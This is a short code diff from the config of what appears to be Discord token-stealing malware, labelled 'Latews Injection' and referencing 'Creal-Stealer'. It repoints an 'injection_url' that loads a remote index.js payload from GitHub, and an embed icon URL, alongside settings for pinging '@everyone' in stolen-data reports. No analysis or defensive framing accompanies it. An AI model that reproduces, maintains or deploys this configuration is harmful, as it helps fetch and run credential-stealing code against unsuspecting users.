@@ -12,9 +12,9 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Latews Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/new/main/smile.png'.replace(/ /g, '%20'), 
+  embed_icon: 'https://raw.githubusercontent.com/latews1/injection/main/smile.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/latews1/injection/new/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/latews1/injection/main/index.js', 
   /**
    
    **/
